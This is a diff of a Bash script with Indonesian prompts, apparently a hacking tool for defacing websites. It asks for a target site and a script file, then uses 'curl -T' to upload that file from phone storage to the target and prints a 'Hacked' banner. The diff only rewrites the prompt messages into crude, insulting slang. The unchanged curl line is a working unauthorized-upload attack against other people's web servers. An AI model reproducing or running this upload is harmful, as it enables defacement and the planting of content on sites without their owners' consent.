@@ -34,18 +34,18 @@ read -p "[PILIH]:~# "  apaan
 echo
 if [ $apaan = "A" ] || [ $apaan = "a" ]
 then
-echo $me "Simpan SC Di Memory Internal Di Luar Folder "
+echo $me "simpan SCnya di luar memory Internal di luar folder goblok:V"
 echo
 echo $i
 read -p "[WEB TARGET]:~# "  target
 echo
-echo $me "Masukan Script!!! "
+echo $me "Masukin SC lu toll"
 echo $i
 read -p "[SCRIPT]:~# "  script
 curl -T /storage/emulated/0/$script $target
 echo $red "["$ku"Hacked"$me"]"$cy"～～～＞"$i" $target"
 echo $ku
-echo '[KEMBALI TEKAN TOMBOL ENTER]'
+echo '[KEMBALINYA TEKAN TOMBOL ENTER:V]'
 echo $cy
 read -p '[BACK]' asu
 clear
